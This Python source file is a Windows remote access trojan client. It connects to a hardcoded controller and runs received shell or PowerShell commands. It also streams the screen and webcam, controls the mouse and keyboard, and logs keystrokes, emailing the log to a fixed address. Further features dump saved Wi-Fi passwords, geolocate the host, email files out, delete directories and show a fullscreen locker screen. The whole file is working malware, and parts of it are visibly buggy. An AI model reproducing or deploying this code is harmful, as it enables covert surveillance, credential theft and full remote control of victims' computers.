import subprocess
subprocess.getoutput("pip install opencv-python")

import socket, cv2, threading, struct, pickle, pyautogui, datetime, requests, time, subprocess, os, keyboard, shutil, stat, mimetypes
from requests import get
from pynput import keyboard
import smtplib
from email.mime.audio import MIMEAudio
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pywifi import *
from pynput.keyboard import Listener
import numpy as np
# import pyfiglet


class Scanner():
    def __init__(self, ip: str, ports='20-1000'):
        self.ip = ip
        self.ports = ports if type(ports) == type(list()) else [el for el in range(int(ports.split('-'))[0], int(ports.split('-')[1]))]
        self.s = socket.socket(2, 1)
        self.s.setdefaulttimeout(1)
        self.good_ports = []


    def scan(self):
        for el in self.ports:
            try:
                self.s.connect((self.ip, el))
            except:
                pass
            else:
                self.good_ports.append(el)


    def check_ports(self):
        print(self.good_ports)


def scanner(ip, ports='20-1000'):
    sc = Scanner(ip, ports)
    sc.scan()
    sc.check_ports()


def admin():
    #!!!#
    import ctypes, sys

    if not ctypes.windll.shell32.IsUserAnAdmin():
        if __name__ == "__main__":
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            exit(1)
        else:
            pass


#admin()


def wa1ting(ip="192.168.0.12", s=None, it=0):
    del s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\n\tTry to connect " + ip)
    try:
        s.connect((ip, 8888))
    except:
        s.close()
        print("\t\tNot this")
        if it > 2:
            print("\nCrushed")
            return None
        it += 1
        ip, s = wa1ting(ip=ip, s=s, it=it)
        return [ip, s]
    else:
        print("\nConnected")
        return [ip, s]

def mouse(s=None):
    import pyautogui
    while True:
        com = s.recv(1024).decode("cp65001")
        print(com)
        ev = com.split()[0]
        coor = (com.split()[-1])[0:-1]
        x, y = coor.split(", ")
        x = int(x); y = int(y)
        if ev == "Pointer":
            pyautogui.moveTo(x, y)
        elif ev == "Pressed":
            pyautogui.click(x, y)
        elif ev == "Scrolled":
            break


"""import pyautogui

while True:
    x, y = (s.recv(1024).decode("cp65001")).split()
    pyautogui.moveTo(x, y)"""

"""
This module implements the main functionality of vidstream.

Author: Florian Dedov from NeuralNine
YouTube: https://www.youtube.com/c/NeuralNine
"""

__author__ = "Florian Dedov, NeuralNine"
__email__ = "mail@neuralnine.com"
__status__ = "planning"

class StreamingServer:
    """
    Class for the streaming server.

    Attributes
    ----------

    Private:

        __host : str
            host address of the listening server
        __port : int
            port on which the server is listening
        __slots : int
            amount of maximum avaialable slots (not ready yet)
        __used_slots : int
            amount of used slots (not ready yet)
        __quit_key : chr
            key that has to be pressed to close connection
        __running : bool
            inicates if the server is already running or not
        __block : Lock
            a basic lock used for the synchronization of threads
        __server_socket : socket
            the main server socket


    Methods
    -------

    Private:

        __init_socket : method that binds the server socket to the host and port
        __server_listening: method that listens for new connections
        __client_connection : main method for processing the client streams

    Public:

        start_server : starts the server in a new thread
        stop_server : stops the server and closes all connections
    """

    # TODO: Implement slots functionality
    def __init__(self, host, port, slots=8, quit_key='q'):
        """
        Creates a new instance of StreamingServer

        Parameters
        ----------

        host : str
            host address of the listening server
        port : int
            port on which the server is listening
        slots : int
            amount of avaialable slots (not ready yet) (default = 8)
        quit_key : chr
            key that has to be pressed to close connection (default = 'q')
        """
        self.__host = host
        self.__port = port
        self.__slots = slots
        self.__used_slots = 0
        self.__running = False
        self.__quit_key = quit_key
        self.__block = threading.Lock()
        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__init_socket()

    def __init_socket(self):
        """
        Binds the server socket to the given host and port
        """
        self.__server_socket.bind((self.__host, self.__port))

    def start_server(self):
        """
        Starts the server if it is not running already.
        """
        if self.__running:
            print("Server is already running")
        else:
            self.__running = True
            server_thread = threading.Thread(target=self.__server_listening)
            server_thread.start()

    def __server_listening(self):
        """
        Listens for new connections.
        """
        self.__server_socket.listen()
        while self.__running:
            self.__block.acquire()
            connection, address = self.__server_socket.accept()
            if self.__used_slots >= self.__slots:
                print("Connection refused! No free slots!")
                connection.close()
                self.__block.release()
                continue
            else:
                self.__used_slots += 1
            self.__block.release()
            thread = threading.Thread(target=self.__client_connection, args=(connection, address,))
            thread.start()

    def stop_server(self):
        """
        Stops the server and closes all connections
        """
        if self.__running:
            self.__running = False
            closing_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            closing_connection.connect((self.__host, self.__port))
            closing_connection.close()
            self.__block.acquire()
            self.__server_socket.close()
            self.__block.release()
        else:
            print("Server not running!")

    def __client_connection(self, connection, address):
        """
        Handles the individual client connections and processes their stream data.
        """
        payload_size = struct.calcsize('>L')
        data = b""

        while self.__running:

            break_loop = False

            while len(data) < payload_size:
                received = connection.recv(4096)
                if received == b'':
                    connection.close()
                    self.__used_slots -= 1
                    break_loop = True
                    break
                data += received

            if break_loop:
                break

            packed_msg_size = data[:payload_size]
            data = data[payload_size:]

            msg_size = struct.unpack(">L", packed_msg_size)[0]

            while len(data) < msg_size:
                data += connection.recv(4096)

            frame_data = data[:msg_size]
            data = data[msg_size:]

            frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            cv2.imshow(str(address), frame)
            if cv2.waitKey(1) == ord(self.__quit_key):
                connection.close()
                self.__used_slots -= 1
                break


class StreamingClient:
    """
    Abstract class for the generic streaming client.

    Attributes
    ----------

    Private:

        __host : str
            host address to connect to
        __port : int
            port to connect to
        __running : bool
            inicates if the client is already streaming or not
        __encoding_parameters : list
            a list of encoding parameters for OpenCV
        __client_socket : socket
            the main client socket


    Methods
    -------

    Private:

        __client_streaming : main method for streaming the client data

    Protected:

        _configure : sets basic configurations (overridden by child classes)
        _get_frame : returns the frame to be sent to the server (overridden by child classes)
        _cleanup : cleans up all the resources and closes everything

    Public:

        start_stream : starts the client stream in a new thread
    """

    def __init__(self, host, port):
        """
        Creates a new instance of StreamingClient.

        Parameters
        ----------

        host : str
            host address to connect to
        port : int
            port to connect to
        """
        self.__host = host
        self.__port = port
        self._configure()
        self.__running = False
        self.__client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def _configure(self):
        """
        Basic configuration function.
        """
        self.__encoding_parameters = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

    def _get_frame(self):
        """
        Basic function for getting the next frame.

        Returns
        -------

        frame : the next frame to be processed (default = None)
        """
        return None

    def _cleanup(self):
        """
        Cleans up resources and closes everything.
        """
        cv2.destroyAllWindows()

    def __client_streaming(self):
        """
        Main method for streaming the client data.
        """
        self.__client_socket.connect((self.__host, self.__port))
        while self.__running:
            frame = self._get_frame()
            result, frame = cv2.imencode('.jpg', frame, self.__encoding_parameters)
            data = pickle.dumps(frame, 0)
            size = len(data)

            try:
                self.__client_socket.sendall(struct.pack('>L', size) + data)
            except ConnectionResetError:
                self.__running = False
            except ConnectionAbortedError:
                self.__running = False
            except BrokenPipeError:
                self.__running = False

        self._cleanup()

    def start_stream(self):
        """
        Starts client stream if it is not already running.
        """

        if self.__running:
            print("Client is already streaming!")
        else:
            self.__running = True
            client_thread = threading.Thread(target=self.__client_streaming)
            client_thread.start()

    def stop_stream(self):
        """
        Stops client stream if running
        """
        if self.__running:
            self.__running = False
        else:
            print("Client not streaming!")


class CameraClient(StreamingClient):
    """
    Class for the camera streaming client.

    Attributes
    ----------

    Private:

        __host : str
            host address to connect to
        __port : int
            port to connect to
        __running : bool
            inicates if the client is already streaming or not
        __encoding_parameters : list
            a list of encoding parameters for OpenCV
        __client_socket : socket
            the main client socket
        __camera : VideoCapture
            the camera object
        __x_res : int
            the x resolution
        __y_res : int
            the y resolution


    Methods
    -------

    Protected:

        _configure : sets basic configurations
        _get_frame : returns the camera frame to be sent to the server
        _cleanup : cleans up all the resources and closes everything

    Public:

        start_stream : starts the camera stream in a new thread
    """

    def __init__(self, host, port, x_res=1280, y_res=720):
        """
        Creates a new instance of CameraClient.

        Parameters
        ----------

        host : str
            host address to connect to
        port : int
            port to connect to
        x_res : int
            the x resolution
        y_res : int
            the y resolution
        """
        self.__x_res = x_res
        self.__y_res = y_res
        self.__camera = cv2.VideoCapture(0)
        super(CameraClient, self).__init__(host, port)

    def _configure(self):
        """
        Sets the camera resultion and the encoding parameters.
        """
        self.__camera.set(3, self.__x_res)
        self.__camera.set(4, self.__y_res)
        super(CameraClient, self)._configure()

    def _get_frame(self):
        """
        Gets the next camera frame.

        Returns
        -------

        frame : the next camera frame to be processed
        """
        ret, frame = self.__camera.read()
        return frame

    def _cleanup(self):
        """
        Cleans up resources and closes everything.
        """
        self.__camera.release()
        cv2.destroyAllWindows()


class VideoClient(StreamingClient):
    """
    Class for the video streaming client.

    Attributes
    ----------

    Private:

        __host : str
            host address to connect to
        __port : int
            port to connect to
        __running : bool
            inicates if the client is already streaming or not
        __encoding_parameters : list
            a list of encoding parameters for OpenCV
        __client_socket : socket
            the main client socket
        __video : VideoCapture
            the video object
        __loop : bool
            boolean that decides whether the video shall loop or not


    Methods
    -------

    Protected:

        _configure : sets basic configurations
        _get_frame : returns the video frame to be sent to the server
        _cleanup : cleans up all the resources and closes everything

    Public:

        start_stream : starts the video stream in a new thread
    """

    def __init__(self, host, port, video, loop=True):
        """
        Creates a new instance of VideoClient.

        Parameters
        ----------

        host : str
            host address to connect to
        port : int
            port to connect to
        video : str
            path to the video
        loop : bool
            indicates whether the video shall loop or not
        """
        self.__video = cv2.VideoCapture(video)
        self.__loop = loop
        super(VideoClient, self).__init__(host, port)

    def _configure(self):
        """
        Set video resolution and encoding parameters.
        """
        self.__video.set(3, 1024)
        self.__video.set(4, 576)
        super(VideoClient, self)._configure()

    def _get_frame(self):
        """
        Gets the next video frame.

        Returns
        -------

        frame : the next video frame to be processed
        """
        ret, frame = self.__video.read()
        return frame

    def _cleanup(self):
        """
        Cleans up resources and closes everything.
        """
        self.__video.release()
        cv2.destroyAllWindows()


class ScreenShareClient(StreamingClient):
    """
    Class for the screen share streaming client.

    Attributes
    ----------

    Private:

        __host : str
            host address to connect to
        __port : int
            port to connect to
        __running : bool
            inicates if the client is already streaming or not
        __encoding_parameters : list
            a list of encoding parameters for OpenCV
        __client_socket : socket
            the main client socket
        __x_res : int
            the x resolution
        __y_res : int
            the y resolution


    Methods
    -------

    Protected:

        _get_frame : returns the screenshot frame to be sent to the server

    Public:

        start_stream : starts the screen sharing stream in a new thread
    """

    # def __init__(self, host, port, x_res=GetSystemMetrics(0), y_res=GetSystemMetrics(1)):
    def __init(self, host, port, x_res=1080, y_res=1920):
        """
        Creates a new instance of ScreenShareClient.

        Parameters
        ----------

        host : str
            host address to connect to
        port : int
            port to connect to
        x_res : int
            the x resolution
        y_res : int
            the y resolution
        """
        self.__x_res = x_res
        self.__y_res = y_res
        super(ScreenShareClient, self).__init__(host, port)

    def _get_frame(self):
        """
        Gets the next screenshot.

        Returns
        -------

        frame : the next screenshot frame to be processed
        """
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame = cv2.resize(frame, (self.__x_res, self.__y_res), interpolation=cv2.INTER_AREA)
        return frame


def scan_wifi():
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    profile = Profile()
    profile.ssid = ""  # requires wifi
    profile.auth = const.AUTH_ALG_OPEN  # password
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # encryption
    profile.cipher = const.CIPHER_TYPE_CCMP  # enc
    # ifaces.remove_all_network_profiles()  # delete conf files
    tmp_profile = ifaces.add_network_profile(profile)  # conf file
    ifaces.connect(tmp_profile)  # connect
    time.sleep(10)


def wait(ip, data, main_data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, 8888))
    except:
        for ipp in range(len(data)):
            dt = data[ipp]
            del data[ipp]
            print(dt)
            wait(dt, data, main_data)
        if data == []:
            data = main_data
            wait(main_data[0], data, main_data)
    else:
        return ip


def prepare():
    data1 = (subprocess.check_output(["ipconfig", "/all"]).decode("cp866")).split('\n')
    data = []
    dAta = []
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    interfaces = ifaces.name()
    scan_wifi()
    tru = False
    true = False
    for line in data1:
        if interfaces in line:
            true = True
        if true and ("DNS-servers" in line or "DNS Servers" in line):
            tru = True
        if tru:
            line = "".join("".join(line.split(" ")[-1]).split("\r"))
            data.append(line)
            dAta.append(line)
    # ip = wait(ip="192.168.0.12", data=data, main_data=dAta)


global end_dt
global perm_dt
perm_dt = 1


def waiting(ip="192.168.0.12", s=None):
    global end_dt
    global perm_dt

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, 8888))
        end_dt = datetime.datetime.now()
    except:
        s.close()
        if perm_dt == 1:
            perm_dt = datetime.datetime.now()
        s = waiting(s=s)
        return s
    else:
        return s


def show_ip(lp=None, public_ip=None, s=None):
    try:
        geo = []
        geo.append(public_ip + " - public ip\n" + lp + " - local ip")

        ip = public_ip
        response = requests.get(url=f"http://ip-api.com/json/{ip}").json()
        if response["status"] == "fail":
            return "fail"
        for name in response:
            name = str(name)
            if "country" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "regionName" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "city" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lat" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lon" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "as" in name:
                geo.append("computer" + " -->> " + str(response[name]))
        """area = folium.Map(location=[response.get("lat"), response.get("lon")])
        area.save(f"{response.get('query')} {response.get('city')}.html")"""
        return "\n".join(geo)
    except requests.exceptions.ConnectionError:
        s.send("Check wireless connection".encode("utf-8"))
        return
    except Exception as e:
        s.send(str(e).encode("utf-8"))
        return e


def ti(dt_pr, dt_now):
    date = (str(dt_now).split(" "))[0] + '---' + (str(dt_pr).split(" "))[0]
    if dt_now == 0:
        tm = "0:0:0"
    else:
        tm = str(dt_now - dt_pr)
    sec = str(round(float(tm.split(":")[-1])))
    minutes = str(int(tm.split(":")[1]))
    hours = str(round(float(tm.split(":")[0])))
    tm = []
    tm.append(hours)
    tm.append(minutes)
    tm.append(sec)
    tm = "=".join(tm)
    return date + "_" + tm


def video(tm, timer):
    import pyautogui
    screen = pyautogui.screenshot("screenshot.png")
    # print(screen)
    to = -1
    import cv2, pyautogui
    import numpy as np

    SCREEN_SIZE = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")

    out = cv2.VideoWriter(tm + ".avi", fourcc, 20.0, (SCREEN_SIZE))

    while True:
        try:
            img = pyautogui.screenshot()

            frame = np.array(img)

            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            out.write(frame)
            if to == -1:
                to = (tm.split("_")[-1])
                # print(int(to.split("=")[-1]))
            # op = float(((str(datetime.datetime.now())).split(" ")[-1]).split(":")[-1])
            if int(time.perf_counter() - int(to.split("=")[-1])) > timer:
                # print(op)
                break
        except:
            break
    # cv2.destroyAllWindows()
    out.release()
    return tm + ".avi"


def kboard(com):
    def writeing_to_the_keyboard(text):
        keyboard.write(text)

    def hotk(key, text):
        keyboard.add_hotkey(key, lambda: keyboard.write(text))

    if "writeing" in com:
        writeing_to_the_keyboard((com.split("#")[-1]).split("|")[-1])
    elif "hotk" in com:
        hotk(com.split("|")[1], com.split("|")[-1])


def v1deo(tm, s=None, ip="192.168.0.12"):
    import pyautogui
    # screen = pyautogui.screenshot("screenshot.png")

    import cv2, pyautogui
    import numpy as np

    SCREEN_SIZE = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")

    out = cv2.VideoWriter(str(tm) + ".avi", fourcc, 20.0, (SCREEN_SIZE))

    while True:
        try:
            img = pyautogui.screenshot()

            frame = np.array(img)

            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            out.write(frame)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 8888))
            except:
                s.close()
            else:
                break
        except KeyboardInterrupt as e:
            out.release()
            # send_video(str(tm) + ".avi")
            pass
            # print(str(tm) + ".avi")
            print(e)
            exit(1)
            # break
        except:
            break
    # cv2.destroyAllWindows()
    out.release()
    return str(tm) + ".avi", s


def ch_dir(dir):
    os.chdir(dir)


def tr():
    qy = []
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
    Wi_Fis = []
    i = 0
    res = []
    for line in data:
        if "All User Profile" in line or "Current User Profile" in line:
            Wi_Fis.append(line.split(':')[1][1:-1])

    for Wi_Fi in Wi_Fis:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', Wi_Fi, 'key=clear']).decode('cp866'). \
            split('\n')
        for line in results:
            if "Key Content" in line:
                res.append(line.split(':')[1][1:-1])
        try:
            qy.append(f"Name: {Wi_Fi}, Password: {res[i]}")
            i += 1
        except IndexError:
            qy.append(f"Name: {Wi_Fi}, Pass not found!")
    if len(qy) == 0:
        qy.append("No wifi connection")
    return "\n".join(qy)


def cpy(path, main_path):
    path = (path.split("\\"))[-1]
    subprocess.getoutput("copy " + path + " " + main_path + "\\" + path)


def wlk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):  # if file, ...
            os.chmod(path, stat.S_IWRITE)
            os.remove(path)
        else:  # if dir, ...
            wlk(path)
            os.rmdir(path)


def wolk(dir, file, checked=[], flag=False):
    try:
        for name in os.listdir(dir):
            path = os.path.join(dir, name)
            if path in checked:
                pass
            else:
                if os.path.isfile(path):
                    if file in name:
                        flag = True
                        checked.append(path)
                        return [path, checked]
                    else:
                        checked.append(path)
                else:
                    if file == name:
                        flag = True
                        checked.append(path)
                        return [path, checked]
                    checked.append(path)
                    try:
                        pa = wolk(path, file, flag=flag)[0]
                    except:
                        pa = None
                    if pa == None:
                        # path = "\\".join(path.split("\\")[0:-1])
                        if path in checked:
                            path = "\\".join(path.split("\\")[0:-1])
                            checked.append(path)
                        else:
                            pass
                        # path = "\\".join(path.split("\\")[0:-1])
                        if not flag:
                            try:
                                pa = wolk(path, file, flag=flag)[0]
                            except:
                                pa = None
                    q = [pa, checked]
                    return q
    except:
        try:
            if pa == None:
                pa = "No files"
            return [pa, []]
        except Exception as e:
            return str(e) + "=>\n=> No files", []
    return (None, checked)


def py_to_exe(file, s):
    """with open(file + ".py", "w") as tr:
        tr.write()"""
    os.system("pip install pyinstaller")
    os.system("pyinstaller -F " + file)
    s.send("ready".encode("utf-8"))
    folder = "py_to_exe_" + file
    try:
        os.mkdir("\\".join((os.path.abspath(file).split("\\"))[0:-2] + "\\" + (file.split("."))[0]))
    except FileExistsError:
        pass
    os.chmod("\\".join((os.path.abspath(file).split("\\"))[0:-1]), stat.S_IWRITE)
    shutil.move(os.path.abspath("build"), os.path.abspath(folder))
    shutil.move(os.path.abspath("__pycache__"), os.path.abspath(folder))
    shutil.move(os.path.abspath("dist"), os.path.abspath(folder))
    shutil.move(os.path.abspath(file.split(".")[0] + ".spec"), os.path.abspath(folder))
    shutil.move(os.path.abspath(file.split(".")[0] + ".py"), os.path.abspath(folder))
    os.chdir(folder)
    os.chdir("dist")


def keylog():
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")

    def on_press(key):
        if key == keyboard.Key.esc or key == keyboard.Key.enter:
            return False  # stop listener
        try:
            k = key.char  # single-char keys
        except:
            k = key.name  # other keys
        logging.info(str(key))

    """with open("h.txt", "a+", encoding="utf-8") as pop:
        pop.write(on_press())"""
    with Listener(on_press=on_press) as listener:
        listener.join()
    send_email("verart1@yandex.ru", "keylog.txt")


def walk(msg, dir):
    names = []
    path3s = []
    for name in os.listdir(dir):
        path3 = os.path.join(dir, name)
        path3s.append(path3)
        names.append(name)
    for name in os.listdir(dir):
        path3 = os.path.join(dir, name)
        if os.path.isfile(path3):
            atach_file(msg, path3)
        else:
            walk(msg, path3)


def virus(python):
    file = open(python, "r")
    original_code = ""
    for line in file:
        original_code += line
    # file.close()
    return original_code


def send_email(addr_to, f1le, msg_subj="Test", msg_text="hello"):
    msg = MIMEMultipart()
    addr_from = ""  # Sender
    password = ""  # Password

    # msg = MIMEMultipart()
    msg['From'] = addr_from
    msg['To'] = addr_to
    msg['Subject'] = msg_subj

    body = msg_text
    msg.attach(MIMEText(body, 'plain'))

    # process_attachement(msg, files)
    try:
        atach_file(msg, f1le)
    except:
        pass

    server = smtplib.SMTP_SSL('smtp.mail.ru')
    server.login(addr_from, password)
    server.send_message(msg, from_addr=addr_from, to_addrs=addr_to)
    server.quit()


def atach_file(msg, filepath):
    ctype, encoding = mimetypes.guess_type(filepath)
    maintype, subtype = ctype.split('/', 1)
    if maintype == 'text':
        with open(filepath, "r", encoding="utf-8") as fp:
            file = MIMEText(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'image':
        with open(filepath, 'rb') as fp:
            file = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'audio':
        with open(filepath, 'rb') as fp:
            file = MIMEAudio(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    file.add_header('Content-Disposition', 'attachment', filename=(filepath.split("\\"))[-1])


email = ""
password = ""
dest_email = "verart1@yandex.ru"


def read_file(python):
    filepath = os.path.abspath(python)
    # ctype, encoding = mimetypes.guess_type(filepath)
    # maintype, subtype = ctype.split('/', 1)
    with open(python, "r", encoding='utf-8') as file:
        original_code = ""
        for line in file:
            original_code += line
        # print(original_code)
        file.close()
    return original_code


def find_file(path, d="max"):
    max_flag = False
    if d == "max":
        max_flag = True
        d = 0
    elif d == "":
        d = 3
    else:
        d = int(d)
    pr = []
    checked = []
    pa = None
    d1 = 0
    while d1 < d or max_flag:
        pa, checked = wolk(os.getdir(), path, checked=[])
        if pa == None:
            break
        if pa not in pr:
            pr.append(pa)
        d1 += 1
    if pr == []:
        pr = ["No files"]
    return pr


def communicate(s):
    full_mes = ""
    while True:
        msg = s.recv(4096).decode("utf-8") + "\n"
        full_mes += msg
        if msg == "Stop":
            break
    keyboard.write(full_mes)


def lock(pas="User"):
    import pyautogui
    from tkinter import Tk, Entry, Label
    from pyautogui import click, moveTo
    from time import sleep
    global k
    global entry

    def callback(event):
        global k, entry
        if entry.get() == pas:
            k = True

    def on_closing():
        moveTo(width / 2, height / 2)
        root.attributes("-fullscreen", True)
        root.protocol("WM_DELETE_WINDOW", on_closing)
        root.update()
        root.bind('<Control-KeyPress-c>', callback)

    root = Tk()
    pyautogui.FAILSAFE = False
    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()
    root.title('From "30" with love')
    root.attributes("-fullscreen", True)
    entry = Entry(root, font=1)
    entry.place(width=150, height=50, x=width / 2 - 75, y=height / 2 - 25)
    label0 = Label(root, text=f"Critical Locker by {pas} Damn", font=1)
    label0.grid(row=0, column=0)
    label1 = Label(root, text="Write password and press Ctrl+C", font='Arial 20')
    label1.place(x=width / 2 - 75 - 130, y=height / 2 - 25 - 100)
    root.update()
    sleep(0.5)
    click(width / 2, height / 2)
    k = False
    while not k:
        on_closing()
    else:
        root.destroy()


global screen
global camera


def spy(cmd_dt, s, ip):
    host = ip
    global screen
    global camera
    if cmd_dt == "screen":
        screen = ScreenShareClient(host, 9999)
        screen.start_stream()
    elif cmd_dt == "mouse":
        mouse(s)
    elif cmd_dt == "webcam":
        camera = CameraClient(host, 9999)
        camera.start_stream()
    elif cmd_dt == "stop_screen":
        screen.stop_stream()
    elif cmd_dt == "stop_webcam":
        camera.stop_stream()


is_ps = False;


def MAIN(command, s, ip):
    if "py_to_exe" == command.split(":")[0]:
        try:
            py_to_exe((command.split(":"))[-1], s)
        except:
            s.send("done".encode("utf-8"))
    elif "scan_ports" == command.split()[0]:
        command = command.split()
        scanner(command[1], command[2] if len(command) == 3 else None)
    elif "lock" == command:
        pas = command.split(" ")[-1]
        lock(pas)
    elif "read" == command.split(" ")[0]:
        if len(command.split(" ")) == 3:
            rf = (read_file((command.split(" "))[1]))
        else:
            rf = (read_file((command.split(" "))[-1]))
        s.send(rf.encode("utf-8"))
    elif command == "show_geo":
        lp = str(socket.gethostbyname(socket.gethostname()))
        p_ip = get("http://api.ipify.org").text
        ip1 = show_ip(lp, p_ip, s)
        if ip1 != []:
            s.send(ip1.encode("utf-8"))
        else:
            s.send("Is not connected".encode("utf-8"))
    elif "abbort_client" == command.split(" ")[0]:
        exit(1)
    elif "ch_dir" == command.split(" ")[0] and len(command.split(" ")) == 2:
        if (command.split(" "))[-1] == "C:" or (command.split(" "))[-1] == "A:" or (command.split(" "))[
            -1] == "B:" or (command.split(" "))[-1] == "D:" or (command.split(" "))[-1] == "Z:" or \
                (command.split(" "))[-1] == "F:":
            os.chdir((command.split(" "))[-1])
            # s.send((os.getdir()).encode())
            pass
        elif ((command.split(" "))[-1] not in os.listdir(
                "\\".join(((os.path.abspath((command.split(" "))[-1])).split("\\"))[0:-1]))) and (
                (command.split(" ")[-1]) != ".."):
            s.send("No such directory.\n".encode())
            pass
        os.chdir((command.split(" "))[-1])
        # s.send((subprocess.getoutput("cd")).encode())
    elif "send_video" == command.split(" ")[0]:
        timer = int(command.split(" ")[-1])
        _ = ti(timer, 0)
        pathr = video(_, timer)
        # send_video(pathr)
        pass
        os.remove(pathr)
    elif "delete" == command.split(" ")[0]:
        if os.path.isfile((command.split(" "))[-1]):
            try:
                os.remove((command.split())[-1])
                # pathlib.Path.unlink(os.path.abspath((command.split(" ")[-1])), missing_ok=True)
            except:
                try:
                    os.remove((command.split(" "))[-1])
                except:
                    pass
        else:
            # shutil.rmtree(str(command.split(" ")[-1]))
            """try:
                os.listdir(os.path.normpath((command.split(" "))[-1]))
            except FileNotFoundError:
                s.send("FileNotFoundError".encode())
                continue"""
            wlk(os.path.abspath(((command.split(" "))[-1])))
            try:
                os.rmdir(((command.split(" "))[-1]))
            except:
                pass
    elif "make_d" == command.split(" ")[0]:
        subprocess.getoutput("md " + (command.split(" "))[-1])
        os.chdir((command.split(" "))[-1])
        s.send((subprocess.getoutput("cd")).encode())
    elif "show_wifi_pass" == command:
        guts = tr()
        s.send(guts.encode("utf-8"))
    elif "kboard" == command.split("#")[0]:
        kboard(command.split("#")[-1])
    elif "edit" == command.split(" ")[0]:
        name = (command.split(" "))[-1]
        # s.send(read_file(name).encode())
        if name not in os.listdir(subprocess.getoutput("cd")):
            file = open(name, "w", encoding="utf-8")
            file.write("New file")
            file.close()
        file = open(name, "r", encoding="utf-8")
        s.send((file.read()).encode("utf-8"))
        file.close()
        isp = s.recv(4096 * 1024).decode("utf-8")
        with open(name, "w", encoding="utf-8") as fl:
            fl.write(isp)
            fl.close()
        s.send(read_file(name).encode("utf-8"))
        # s.send((or_co).encode())
    elif "find_file" == command.split(" ")[0]:
        spl = command.split(" ")
        path = find_file(spl[1])
        path = "\n".join(path)
        s.send(path.encode("utf-8"))
    elif "lock" == command.split(" ")[0]:
        if len(command.split(" ")) == 2:
            lock(pas=(command.split(" ")[-1]))
        else:
            lock()
    elif command == "dialog":
        # subprocess.getoutput("notepad")
        communicate(s)
        # keyboard.press_and_release("ctrl+s", "Alt+F4")
    elif "spy" == command.split(" ")[0]:
        spy(command.split(" ")[-1], s, ip)
    elif "start" == command.split(" ")[0]:
        os.startfile((command.split(" "))[-1])
        s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = waiting(ip, s)
    elif "check_wifi" == command:
        s.send(subprocess.getoutput("arp -a").encode("utf-8"))
    elif "cpy_mail" == command.split(" ")[0]:
        cd = True
        file = (command.split(" "))[1]
        send_email(dest_email, file)
    elif "spy_mouse" == command:
        mouse(s)
    elif "send_file" == command.split(" ")[0]:
        guts = s.recv(4096 * 1024).decode("utf-8")
        f = open("sended_" + command.split(" ")[-1], "w", encoding="utf-8")
        f.write(guts)
        f.close()
    elif "cpy" == command.split(" ")[0]:
        rf = (read_file((command.split(" "))[-1]))
        s.send(rf.encode())
    elif command == "screenshot":
        screen = pyautogui.screenshot("screenshot.png")
        # send_email(addr_to="verart1@yandex.ru", f1le="screenshot.png")
        del screen
        # os.remove("screenshot.png")
    elif command == "" or command == "\n":
        # s.send(''.encode())
        pass
    else:
        if is_ps:
            output = subprocess.getoutput("powershell -c \"" + command + "\"")
        else:
            output = subprocess.getoutput(command)
        s.send(output.encode())
